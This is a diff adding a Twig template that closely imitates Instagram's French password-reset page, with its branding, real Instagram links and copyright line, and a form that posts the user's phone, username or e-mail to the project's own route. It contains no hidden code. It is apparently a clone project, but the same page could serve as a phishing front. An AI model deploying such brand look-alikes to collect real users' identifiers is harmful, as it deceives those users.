@@ -1,0 +1,391 @@
+{% extends 'base.html.twig' %}
+
+{% block title %}Instagram – Mot de passe oublié
+{% endblock %}
+
+{% block stylesheets %}
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+	<style>
+	:root {
+		--ig-primary-background: 0, 0, 0;
+		--ig-right-bg: #101923;
+		--ig-input-bg: transparent;
+		--ig-primary-text: 245, 245, 245;
+		--ig-secondary-text: 168, 168, 168;
+		--ig-tertiary-text: 115, 115, 115;
+		--ig-separator: 54, 54, 54;
+		--ig-stroke: 54, 54, 54;
+		--ig-focus-stroke: 85, 85, 85;
+		--ig-primary-button: 0, 149, 246;
+		--ig-primary-button-hover: 24, 119, 242;
+		--ig-input-border-radius: 16px;
+		--ig-input-border: 62, 68, 81;
+		--ig-link: 224, 241, 255;
+		--ig-facebook-blue: 24, 119, 242;
+		--ig-blue: 0, 149, 246;
+		--ig-blue-hover: 24, 119, 242;
+	}
+
+	* {
+		margin: 0;
+		padding: 0;
+		box-sizing: border-box;
+	}
+
+	html, body {
+		height: 100%;
+		font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+		background: var(--ig-right-bg);
+		color: rgb(var(--ig-primary-text));
+		font-size: 14px;
+		line-height: 1.5;
+		overflow: hidden;
+	}
+
+	.ig-page {
+		display: flex;
+		flex-direction: column;
+		min-height: 100vh;
+	}
+
+	.ig-main {
+		display: flex;
+		justify-content: center;
+		padding: 30px 24px 0;
+	}
+
+	.ig-form-box {
+		width: 100%;
+		max-width: 620px;
+	}
+
+	/* Bouton retour */
+	.ig-back {
+		display: inline-flex;
+		align-items: center;
+		justify-content: center;
+		width: 48px;
+		height: 48px;
+		background: transparent;
+		border: none;
+		border-radius: 50%;
+		color: rgb(var(--ig-primary-text));
+		cursor: pointer;
+		margin-bottom: 12px;
+		margin-left: -9px;
+		padding: 0;
+		text-decoration: none;
+		transition: background 0.2s;
+	}
+
+	.ig-back:hover {
+		background: rgba(255, 255, 255, 0.06);
+	}
+
+	.ig-back svg {
+		width: 30px;
+		height: 30px;
+		fill: none;
+		stroke: rgb(var(--ig-primary-text));
+		stroke-width: 2;
+		stroke-linecap: round;
+		stroke-linejoin: round;
+	}
+
+	/* Titre */
+	.ig-reset-title {
+		font-size: 1.7rem;
+		font-weight: 600;
+		color: rgb(var(--ig-primary-text));
+		margin-bottom: 10px;
+	}
+
+	.ig-reset-subtitle {
+		font-size: 1.05rem;
+		font-weight: 400;
+		color: rgb(var(--ig-primary-text));
+		margin-bottom: 14px;
+		line-height: 1.55;
+	}
+
+	.ig-reset-subtitle a {
+		color: rgb(var(--ig-blue));
+		text-decoration: none;
+	}
+
+	.ig-reset-subtitle a:hover {
+		text-decoration: underline;
+	}
+
+	/* Inputs */
+	.ig-input-wrap {
+		position: relative;
+		margin-bottom: 19px;
+	}
+
+	.ig-input {
+		width: 100%;
+		background: transparent;
+		border: 1.5px solid rgb(var(--ig-input-border));
+		border-radius: var(--ig-input-border-radius);
+		color: rgb(var(--ig-primary-text));
+		font-size: 1.1rem;
+		font-weight: 400;
+		height: 60px;
+		padding: 14px 18px 8px;
+		outline: none;
+		transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+		font-family: inherit;
+	}
+
+	.ig-input::placeholder {
+		color: transparent;
+	}
+
+	.ig-floating-label {
+		position: absolute;
+		left: 18px;
+		top: 50%;
+		transform: translateY(-50%);
+		color: rgb(var(--ig-secondary-text));
+		font-size: 1.1rem;
+		font-weight: 400;
+		pointer-events: none;
+		transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+		transform-origin: left center;
+		line-height: 1;
+	}
+
+	.ig-input:focus + .ig-floating-label,
+	.ig-input:not(:placeholder-shown) + .ig-floating-label {
+		top: 10px;
+		transform: translateY(0) scale(0.7);
+		color: rgb(var(--ig-secondary-text));
+	}
+
+	.ig-input:focus {
+		border-color: rgb(var(--ig-blue));
+		background: transparent;
+		box-shadow: 0 0 0 1px rgb(var(--ig-blue));
+	}
+
+	/* Texte info */
+	.ig-info-text {
+		font-size: 0.95rem;
+		font-weight: 700;
+		color: rgb(var(--ig-primary-text));
+		margin-top: -10px;
+		margin-bottom: 16px;
+		line-height: 1.55;
+	}
+
+	/* Bouton Continuer */
+	.ig-btn-primary {
+		width: 100%;
+		background: rgb(var(--ig-blue));
+		border: none;
+		border-radius: 50px;
+		color: #ffffff;
+		font-size: 1.1rem;
+		font-weight: 400;
+		padding: 8px 20px;
+		margin-top: 8px;
+		margin-bottom: 12px;
+		cursor: pointer;
+		transition: background 0.2s ease, transform 0.1s ease, opacity 0.2s;
+		font-family: inherit;
+		letter-spacing: 0.2px;
+	}
+
+	.ig-btn-primary:hover {
+		background: rgb(var(--ig-blue-hover));
+		opacity: 0.95;
+	}
+
+	.ig-btn-primary:active {
+		transform: scale(0.99);
+	}
+
+	/* Alerte erreur */
+	.ig-alert {
+		background: rgba(237, 73, 86, 0.12);
+		border: 1px solid rgba(237, 73, 86, 0.3);
+		border-radius: 10px;
+		color: rgb(254, 97, 114);
+		padding: 12px 16px;
+		font-size: 1rem;
+		margin-bottom: 14px;
+		line-height: 1.4;
+	}
+
+	/* Alerte succès */
+	.ig-alert-success {
+		background: rgba(46, 204, 113, 0.12);
+		border: 1px solid rgba(46, 204, 113, 0.3);
+		border-radius: 10px;
+		color: rgb(46, 204, 113);
+		padding: 12px 16px;
+		font-size: 1rem;
+		margin-bottom: 14px;
+		line-height: 1.4;
+	}
+
+	.ig-alert-success a {
+		color: rgb(var(--ig-blue));
+		text-decoration: none;
+		font-weight: 500;
+	}
+
+	.ig-alert-success a:hover {
+		text-decoration: underline;
+	}
+
+	/* Footer */
+	.ig-footer {
+		background: var(--ig-right-bg);
+		border-top: none;
+		padding: 18px 32px 20px;
+		margin-top: 20px;
+	}
+
+	.ig-footer-links {
+		display: flex;
+		flex-wrap: wrap;
+		justify-content: center;
+		gap: 5px 12px;
+		margin-bottom: 10px;
+	}
+
+	.ig-footer-links a {
+		color: rgba(220, 225, 235, 0.75);
+		text-decoration: none;
+		font-size: 0.95rem;
+		transition: text-decoration 0.1s;
+	}
+
+	.ig-footer-links a:hover {
+		color: rgba(220, 225, 235, 0.75);
+		text-decoration: underline;
+	}
+
+	.ig-footer-bottom {
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		flex-wrap: wrap;
+		gap: 14px;
+	}
+
+	.ig-footer-lang {
+		color: rgba(220, 225, 235, 0.75);
+		font-size: 0.95rem;
+		display: flex;
+		align-items: center;
+		gap: 4px;
+		cursor: pointer;
+		background: none;
+		border: none;
+		font-family: inherit;
+		padding: 0;
+	}
+
+	.ig-footer-copyright {
+		color: rgba(220, 225, 235, 0.75);
+		font-size: 0.95rem;
+	}
+
+	@media(max-width: 768px) {
+		.ig-form-box {
+			max-width: 380px;
+		}
+	}
+</style>
+{% endblock %}
+
+{% block body %}
+<div class="ig-page">
+
+	<div class="ig-main">
+		<div class="ig-form-box">
+
+			<!-- Bouton retour -->
+			<a href="{{ path('app_login') }}" class="ig-back">
+				<svg viewBox="0 0 24 24">
+					<path d="M15 18l-6-6 6-6"/>
+				</svg>
+			</a>
+
+			<!-- Titre -->
+			<h1 class="ig-reset-title">Trouvez votre compte</h1>
+			<p class="ig-reset-subtitle">
+				Entrez votre numéro de mobile, votre nom de profil ou votre adresse e-mail.
+				<a href="https://help.instagram.com/374546259294234" target="_blank" rel="noopener">Vous ne parvenez pas à réinitialiser votre mot de passe ?</a>
+			</p>
+
+			{# Erreur #}
+			{% if error is defined and error %}
+				<div class="ig-alert">{{ error }}</div>
+			{% endif %}
+
+			{# Succès #}
+			{% if success is defined and success %}
+				<div class="ig-alert-success">
+					{{ success }} <a href="{{ path('app_login') }}">Se connecter</a>
+				</div>
+			{% endif %}
+
+			<form method="POST" action="{{ path('app_password_reset') }}" novalidate>
+
+				<!-- Identifiant -->
+				<div class="ig-input-wrap">
+					<input type="text" name="identifier" id="inputIdentifier" class="ig-input" placeholder=" " autocomplete="username" required>
+					<label for="inputIdentifier" class="ig-floating-label">Numéro de mobile, nom de profil ou adresse e-mail</label>
+				</div>
+
+				<!-- Texte info -->
+				<p class="ig-info-text">
+					Vous recevrez peut-être des notifications de notre part sur WhatsApp et par SMS à des fins de sécurité et de connexion.
+				</p>
+
+				<!-- Bouton Continuer -->
+				<button type="submit" class="ig-btn-primary">
+					Continuer
+				</button>
+			</form>
+
+		</div>
+	</div>
+
+	<!-- Footer -->
+	<footer class="ig-footer">
+		<div class="ig-footer-links">
+			<a href="https://www.meta.com/fr-fr/about/?utm_source=about.meta.com&utm_medium=redirect" target="_blank" rel="noopener">Meta</a>
+			<a href="https://about.instagram.com/fr-fr" target="_blank" rel="noopener">À propos</a>
+			<a href="https://about.instagram.com/blog/" target="_blank" rel="noopener">Blog</a>
+			<a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener">Emplois</a>
+			<a href="https://help.instagram.com/" target="_blank" rel="noopener">Aide</a>
+			<a href="https://developers.facebook.com/docs/instagram-platform" target="_blank" rel="noopener">API</a>
+			<a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank" rel="noopener">Confidentialité</a>
+			<a href="#">Conditions</a>
+			<a href="#">Lieux</a>
+			<a href="#">Instagram Lite</a>
+			<a href="#">Importation des contacts et non-utilisateurs</a>
+			<a href="#">Meta Verified</a>
+		</div>
+
+		<div class="ig-footer-bottom">
+			<button class="ig-footer-lang">
+				Français
+				<svg width="10" height="8" viewbox="0 0 10 8" fill="none">
+					<path d="M1 1.5L5 5.5L9 1.5" stroke="rgb(115,115,115)" stroke-width="1.5" stroke-linecap="round"/>
+				</svg>
+			</button>
+			<span class="ig-footer-copyright">© 2026 Instagram par Meta</span>
+		</div>
+	</footer>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+{% endblock %}
